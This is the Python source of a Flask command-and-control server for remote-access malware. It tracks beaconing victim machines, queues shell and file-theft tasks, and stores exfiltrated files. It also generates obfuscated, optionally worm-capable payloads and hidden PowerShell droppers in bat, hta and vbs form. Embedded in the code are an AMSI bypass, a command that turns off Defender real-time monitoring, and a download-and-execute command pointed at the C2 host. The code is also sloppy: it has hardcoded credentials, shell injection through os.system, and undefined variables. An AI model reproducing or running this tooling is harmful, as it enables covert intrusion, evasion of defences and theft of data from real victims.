import eventlet
eventlet.monkey_patch()

from flask import send_from_directory, Flask, request, jsonify, render_template, redirect, session, url_for, render_template, request
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask_socketio import SocketIO, emit
import sqlite3
import os
import base64
import json
import sys
from flask import send_from_directory
from datetime import datetime, UTC
import platform
import shutil

from collections import defaultdict

aes_keys_by_client_id = {}

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'tools')))
from ps_builder import generate_obfuscated_ps

def get_default_path():
    return "C:\\" if platform.system() == "Windows" else "/"


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    with open(os.path.join(os.path.dirname(__file__), '..', 'config.json')) as f:
        config = json.load(f)
except FileNotFoundError:
    with open(os.path.join(os.path.dirname(__file__), '..', 'config.example.json')) as f:
        config = json.load(f)

C2_HOST = config.get("c2_host", "http://localhost:8080")


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_decrypt, aes_encrypt

app = Flask(__name__)
app.secret_key = 'super-ghost-key'

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

socketio = SocketIO(app, cors_allowed_origins="*")

DB_PATH = os.path.join(os.path.dirname(__file__), 'beacons.db')

class Operator(UserMixin):
    def __init__(self, id):
        self.id = id

USER_CREDENTIALS = {
    "admin": "ghostpass123"
}

@login_manager.user_loader
def load_user(user_id):
    return Operator(user_id)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS beacons (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, hostname TEXT, timestamp TEXT, payload TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, command TEXT, status TEXT, result TEXT)")
    conn.commit()
    conn.close()

UPLOAD_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'public', 'payloads'))
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER



def to_base64_ps(ps_code):
    # PowerShell expects UTF-16LE encoding for -EncodedCommand
    ps_bytes = ps_code.encode('utf-16le')
    return base64.b64encode(ps_bytes).decode()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
            login_user(Operator(username))
            return redirect(url_for('dashboard'))
        return "Invalid credentials", 401
    return render_template("login.html")

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, hostname, command, status, result FROM tasks ORDER BY id DESC")
    tasks = c.fetchall()
    conn.close()
    return render_template("dashboard.html", tasks=tasks)

@app.route('/api/beacons', methods=['GET'])
@login_required
def get_beacons():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT hostname, ip, timestamp, payload FROM beacons ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()
    beacons = []
    for row in rows:
        hostname, ip, timestamp, payload = row
        try:
            last_seen = datetime.fromisoformat(timestamp)
            delta = (datetime.now(UTC) - last_seen).total_seconds()
        except:
            delta = 999999
        beacons.append({
            "hostname": hostname,
            "ip": ip,
            "last_seen_seconds": delta,
            "payload": payload,
            "timestamp": timestamp
        })
    return jsonify(beacons)

@app.route('/api/beacon/<hostname>')
@login_required
def get_beacon_detail(hostname):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Get the most recent beacon check-in for this host
    c.execute("SELECT ip, payload, MAX(timestamp) as last_seen FROM beacons WHERE hostname = ?", (hostname,))
    row = c.fetchone()

    if not row:
        conn.close()
        return jsonify({"error": "Beacon not found"}), 404

    ip, payload, last_seen = row

    # Get the last 10 tasks
    c.execute("SELECT command, result FROM tasks WHERE hostname = ? ORDER BY id DESC LIMIT 10", (hostname,))
    tasks = [{"command": cmd, "result": res} for cmd, res in c.fetchall()]
    conn.close()

    return jsonify({
        "hostname": hostname,
        "ip": ip,
        "timestamp": last_seen,
        "payload": payload,
        "tasks": tasks
    })



@app.route('/add_task', methods=['POST'])
@login_required
def add_task():
    hostname = request.form.get('hostname')
    command = request.form.get('command')
    if not hostname or not command:
        return "Missing input", 400
    # Detect 'browse' or 'getfile' keywords to auto-wrap in JSON
    if command.strip().startswith("browse "):
        _, path = command.split(" ", 1)
        task_json = json.dumps({"action": "browse", "path": path.strip()})
        to_store = task_json
    elif command.strip().startswith("getfile "):
        _, path = command.split(" ", 1)
        task_json = json.dumps({"action": "getfile", "path": path.strip()})
        to_store = task_json
    else:
        # Fallback: treat as shell command for now
        task_json = json.dumps({"action": "shell", "command": command.strip()})
        to_store = task_json
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, to_store))
    conn.commit()
    conn.close()
    return redirect('/')

@app.route('/console')
@login_required
def console():
    return render_template("console.html")

@app.route('/console_data')
def console_data():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT DISTINCT hostname FROM beacons ORDER BY hostname")
    hosts = [row[0] for row in c.fetchall()]
    conn.close()
    return jsonify({"hosts": hosts})

@app.route('/console_send', methods=['POST'])
@login_required
def console_send():
    data = request.get_json()
    hostname = data.get("hostname")
    command = data.get("command")
    if not hostname or not command:
        return jsonify({"status": "missing params"}), 400
    # Always store as JSON for agent parsing
    task_json = json.dumps({"action": "shell", "command": command.strip()})
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, task_json))
    conn.commit()
    conn.close()
    return jsonify({"status": "task added"})

@app.route('/console_output')
@login_required
def console_output():
    hostname = request.args.get("hostname")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT command, result FROM tasks WHERE hostname = ? AND result != '' ORDER BY id DESC LIMIT 5", (hostname,))
    rows = c.fetchall()
    conn.close()
    output = "\n\n".join([f"$ {cmd}\n{res}" for cmd, res in rows]) or "[+] No output yet..."
    return output

@app.route("/register", methods=["POST"])
def register_aes_key():
    data = request.get_json()
    client_id = data.get("client_id")
    aes_key_b64 = data.get("aes_key")

    if not client_id or not aes_key_b64:
        return "Missing client_id or aes_key", 400

    try:
        aes_keys_by_client_id[client_id] = base64.b64decode(aes_key_b64)
        print(f"[+] Registered AES key for client: {client_id}")
        return "OK", 200
    except Exception as e:
        print(f"[!] Failed to register AES key: {e}")
        return "Error", 500


@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.data.decode()
    from utils.crypto import aes_decrypt

    data = None
    client_id_match = None

    # Attempt AES decryption (for Python agents)
    for client_id, aes_key in aes_keys_by_client_id.items():
        try:
            decrypted = aes_decrypt(encrypted, aes_key)
            parsed = json.loads(decrypted)
            if parsed.get("client_id") == client_id:
                data = parsed
                client_id_match = client_id
                break
        except Exception:
            continue

    # If AES decryption failed, try raw JSON (for PS agents)
    if not data:
        try:
            data = request.get_json()
            client_id_match = "powershell"  # fallback tag
        except Exception as e:
            print("[!] Failed to parse raw JSON beacon:", e)
            return "Decryption failed", 403

    ip = request.remote_addr
    hostname = data.get('hostname', 'unknown')
    payload = data.get('payload', 'none')
    timestamp = datetime.now(UTC).isoformat()

    print(f"[+] Beacon received from {client_id_match} ({hostname}) - {ip} - Payload: {payload}")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)",
            (ip, hostname, timestamp, payload))
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending'", (hostname,))
    tasks = c.fetchall()
    c.execute("UPDATE tasks SET status = 'dispatched' WHERE hostname = ? AND status = 'pending'", (hostname,))
    conn.commit()
    conn.close()

    commands = [cmd for _, cmd in tasks]
    return jsonify({'tasks': commands}), 200


@app.route('/result', methods=['POST'])
def result():
    print("📩 [RESULT RECEIVED]")
    encrypted = request.data.decode()

    # Use registered AES keys to try decrypting
    data = None
    for client_id, key in aes_keys_by_client_id.items():
        try:
            data = json.loads(aes_decrypt(encrypted, key))
            break
        except Exception:
            continue

    if data is None:
        # Try fallback plaintext for PS agents only
        try:
            fallback_payload = json.loads(encrypted)
            if fallback_payload.get("payload", "").lower() == "ps_reverse":
                print("[*] Fallback plaintext result accepted from PowerShell agent")
                data = fallback_payload
            else:
                print("[!] Plaintext fallback rejected: not ps_reverse")
                return jsonify({"error": "Unable to decrypt result"}), 400
        except Exception as ex:
            print(f"[!] Fallback JSON parse failed: {ex}")
            return jsonify({"error": "Unable to decrypt result"}), 400


    hostname = data.get("hostname")
    command = data.get("command")
    result = data.get("result")

    if isinstance(result, dict):
        result = json.dumps(result, indent=2)

    # Handle exfil results
    if isinstance(result, str) and result.startswith("[EXFIL:"):
        try:
            lines = result.splitlines()
            header = lines[0]
            b64data = "\n".join(lines[1:])
            filepath = header.split(":", 1)[1].strip().rstrip("]")
            filename = os.path.basename(filepath)
            decoded = base64.b64decode(b64data)
            outdir = os.path.join("downloads", hostname)
            os.makedirs(outdir, exist_ok=True)
            full_path = os.path.join(outdir, filename)
            with open(full_path, "wb") as f:
                f.write(decoded)
            print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
        except Exception as ex:
            print(f"[!] Failed to process exfil file: {ex}")
    
    try:
        browse_cmd = False
        if isinstance(command, str):
            if command.startswith("browse "):
                browse_cmd = True
            else:
                try:
                    cmd_obj = json.loads(command)
                    if isinstance(cmd_obj, dict) and cmd_obj.get("action") == "browse":
                        browse_cmd = True
                except Exception:
                    pass
        if browse_cmd:
            try:
                browse_json = json.loads(result)
                browse_results[hostname] = browse_json
                print(f"[DEBUG] Cached browse result for {hostname}: {browse_json}")
            except Exception as ex:
                print(f"[!] Failed to parse browse result: {ex}")
    except Exception as ex:
        print(f"[!] Error in browse result handler: {ex}")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'",
        (result, hostname, command)
    )
    conn.commit()
    conn.close()

    # ... existing code above ...
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'",
        (result, hostname, command)
    )
    conn.commit()
    conn.close()

    # Identify PS agents
    payload = data.get("payload", "").lower()
    print(f"[DEBUG] Host: {hostname}, Payload: {payload}")
    is_ps_agent = payload == "ps_reverse"


    if is_ps_agent:
        socketio.emit("ps_output", {
            "hostname": hostname,
            "output": result
        })
    else:
        socketio.emit("console_result", {
            "hostname": hostname,
            "command": command,
            "result": result
        })

    return jsonify({"status": "result stored"})


    return jsonify({"status": "result stored"})


@app.route('/generate', methods=['GET', 'POST'])
@login_required
def generate():
    if request.method == 'POST':
        c2url = request.form.get('c2url')
        resulturl = request.form.get('resulturl')
        filename = request.form.get('filename') or datetime.now(UTC).strftime("ghost_payload_%Y%m%d_%H%M%S")
        fileext = request.form.get('fileext', 'py')

        ext = fileext if fileext in ['py', 'exe'] else 'py'
        full_filename = f"{filename}.{ext}"
        out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds', full_filename))

        os.makedirs(os.path.dirname(out_path), exist_ok=True)

        # AES key (optional input)
        aes_key_b64 = request.form.get('aes_key')
        if not aes_key_b64:
            aes_key = os.urandom(32)
            aes_key_b64 = base64.b64encode(aes_key).decode()
        else:
            aes_key_b64 = aes_key_b64.strip()

        # Build generator command
        GENERATOR_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "../tools/generate_payload.py"))
        cmd = f"python3 {GENERATOR_PATH} --c2 {c2url} --result {resulturl} --output {out_path} --aes {aes_key_b64}"

        if ext == 'exe':
            cmd += " --exe"
        if 'obfuscate' in request.form:
            cmd += " --obfuscate"
        if 'encrypt' in request.form:
            cmd += " --encrypt"
        if 'worm' in request.form:
            cmd += " --worm"

        print(f"[+] Running: {cmd}")
        os.system(cmd)

        return render_template("generate.html", output_path=full_filename, aes_key_used=aes_key_b64)

    return render_template("generate.html")

@app.route('/api/server-ip')
@login_required
def get_server_ip():
    return jsonify({"ip": request.host.split(':')[0]})

@app.route('/download/<filename>')
@login_required
def download_payload(filename):
    builds_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds'))
    full_path = os.path.join(builds_dir, filename)

    if not os.path.isfile(full_path):
        print(f"[!] File not found: {full_path}")
        return f"File not found: {filename}", 404

    print(f"[+] Serving: {full_path}")
    return send_from_directory(builds_dir, filename, as_attachment=True)


@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method == 'POST':
        file = request.files.get('file')
        if not file or file.filename == '':
            return "No file selected", 400

        filename = file.filename
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(save_path)

        ip = request.host.split(':')[0]
        drop_cmd = f"Invoke-WebRequest {C2_HOST}/payloads/{filename} -OutFile {filename}; Start-Process {filename}"

        return render_template("upload.html", success=True, filename=filename, drop_cmd=drop_cmd)

    return render_template("upload.html")

@app.route('/generate_ps_payload', methods=['GET', 'POST'])
@login_required
def generate_ps_payload():
    from tools.ps_builder import generate_polymorphic_ps
    import os

    if request.method == 'POST':
        host = request.form.get('host') or request.host.split(':')[0]
        port = int(request.form.get('port') or 1443)
        http_port = int(request.form.get('http_port') or 8080)

        filename = generate_polymorphic_ps(
            host=host,
            port=port,
            http_port=http_port,
            http_tasker=True,
            xor_encrypt=False,
            auto_recon=False,
            persistence='none',
            write_file=True
        )

        return send_from_directory(
            directory=os.path.abspath("server/payloads"),
            path=filename,
            as_attachment=True
        )

    return render_template('generate_ps.html')

@app.route('/api/browse', methods=['POST'])
def browse_task():
    data = request.json
    hostname = data['hostname']
    raw_path = data.get('path')

    # If path looks like a Windows root on Linux, override it
    if platform.system() != "Windows" and raw_path and raw_path.startswith("C:\\"):
        print(f"[WARN] Overriding invalid Windows path sent to Linux: {raw_path}")
        path = "/"
    else:
        path = raw_path or get_default_path()

    task_json = json.dumps({"action": "browse", "path": path})
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, ?)", (hostname, task_json, "pending"))
    conn.commit()
    conn.close()
    return jsonify({"status": "queued"})


@app.route('/api/browse_result/<hostname>')
def get_browse_result(hostname):
    # In-memory example:
    res = browse_results.get(hostname)
    if res:
        return jsonify(res)
    return jsonify({"error": "No browse result for this host."}), 404

@app.route('/api/download/<hostname>', methods=['GET'])
@login_required
def download_file_from_beacon(hostname):
    filepath = request.args.get('path')
    if not filepath:
        return "Missing path", 400
    # Queue a getfile task for the beacon
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, f"getfile {filepath}",))
    conn.commit()
    conn.close()
    return jsonify({"status": "queued"})


basedir = os.path.abspath(os.path.dirname(__file__))
@app.route('/generate_ps', methods=['GET', 'POST'])
def generate_ps():
    output_path = None

    if request.method == 'POST':
        use_builder = 'use_builder' in request.form
        wrapper = request.form.get('format') or "bat"
        filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
        use_b64 = 'b64encode' in request.form

        if use_builder:
            # Builder mode parameters
            host = request.form.get('host', 'localhost')
            port = int(request.form.get('port') or 1443)
            amsi_bypass = request.form.get('amsi_bypass', 'redundant')
            persistence_method = request.form.get('persistence_method', 'none')
            auto_recon = 'auto_recon' in request.form
            xor_encrypt = 'xor_encrypt' in request.form

            # Generate payload
            ps1_code = generate_obfuscated_ps(
                host=host,
                port=port,
                amsi_bypass=amsi_bypass,
                persistence=persistence_method,
                auto_recon=auto_recon,
                xor_encrypt=xor_encrypt,
                write_file=False
            )
        else:
            # Manual .ps1 mode
            ps1_code = request.form.get('ps1', '')
            if 'evasion_enabled' in request.form:
                amsi_bypass = """
$A='System.Management.Automation.AmsiUtils';
$B=[Ref].Assembly.GetType($A);
$B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""".strip()
                defender_disable = """
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch {}
""".strip()
                ps1_code = f"{amsi_bypass}\n{defender_disable}\n\n{ps1_code}"

        # === Dropper generation ===
        if use_b64:
            b64 = to_base64_ps(ps1_code)
            if wrapper == "bat":
                dropper_code = f'powershell -nop -w hidden -ep bypass -EncodedCommand {b64}'
            elif wrapper == "hta":
                dropper_code = f'''<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}"
self.close
</script>'''
            elif wrapper == "vbs":
                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}", 0'''
        else:
            safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
            if wrapper == "bat":
                dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{safe_ps}"'
            elif wrapper == "hta":
                dropper_code = f'''<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\""
self.close
</script>'''
            elif wrapper == "vbs":
                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\"", 0'''

        # === Save dropper ===
        payload_dir = os.path.join(basedir, "static", "payloads")
        os.makedirs(payload_dir, exist_ok=True)

        full_output_path = os.path.join(payload_dir, filename)
        with open(full_output_path, "w") as f:
            f.write(dropper_code)

        output_path = filename

        # === Debug output ===
        print("[+] Saved dropper to:", full_output_path)
        print("[+] File visible at /payloads/" + output_path)

    return render_template("generate_ps.html", output_path=output_path)

@app.route('/payloads/<filename>')
def payloads_download(filename):
    payload_dir = os.path.join(basedir, 'static', 'payloads')

    # Optional: confirm file visibility
    if not os.path.exists(os.path.join(payload_dir, filename)):
        print("[!] File not found in directory:", payload_dir)
        print("[!] Directory contents:", os.listdir(payload_dir))

    return send_from_directory(payload_dir, filename, as_attachment=True)

@app.route('/console_ps')
@login_required
def console_ps():
    return render_template('console_ps.html')

@app.route('/console_ps_data')
@login_required
def console_ps_data():
    # Return list of only PowerShell-based agents
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT DISTINCT hostname FROM beacons WHERE payload LIKE 'ps_%'")
    hosts = [row[0] for row in c.fetchall()]
    conn.close()
    return jsonify({'hosts': hosts})



# SOCKETIO HANDLERS
@socketio.on('ps_command')
def handle_ps_command(data):
    hostname = data.get('hostname')
    command = data.get('command')

    if not hostname or not command:
        print("[!] Missing hostname or command in ps_command")
        return

    print(f"[+] PS command received: {hostname} -> {command}")

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, 'pending')", (hostname, command))
        conn.commit()
        conn.close()
        print("[+] Task inserted successfully into DB")
    except Exception as e:
        print(f"[!] Failed to insert task: {e}")

def emit_ps_result(hostname, output):
    socketio.emit('ps_output', {
        'hostname': hostname,
        'output': output
    })


@socketio.on('connect')
def handle_connect():
    print("[+] WebSocket client connected.")

@socketio.on('register')
def handle_register(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    print(f"[+] Host registered: {hostname}")
    emit("ack", aes_encrypt(json.dumps({"msg": "Registered"})))

@socketio.on('result')
def handle_result(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    last_seen[hostname] = time.time()
    command = data.get("command")
    result = data.get("result")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
    conn.commit()
    conn.close()

    emit("ack", aes_encrypt(json.dumps({"msg": "Result stored"})))

    socketio.emit("console_result", {
        "hostname": hostname,
        "command": command,
        "result": result
    })

@socketio.on('send_command')
def handle_send_command(data):
    hostname = data.get("hostname")
    command = data.get("command")
    if not hostname or not command:
        return

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()

@socketio.on('request_task')
def handle_task_request(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending' LIMIT 1", (hostname,))
    row = c.fetchone()

    if row:
        task_id, command = row
        c.execute("UPDATE tasks SET status = 'dispatched' WHERE id = ?", (task_id,))
        conn.commit()
        emit("task", aes_encrypt(json.dumps({"command": command})))
    else:
        emit("task", aes_encrypt(json.dumps({"command": ""})))
    conn.close()

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='0.0.0.0', port=8080)
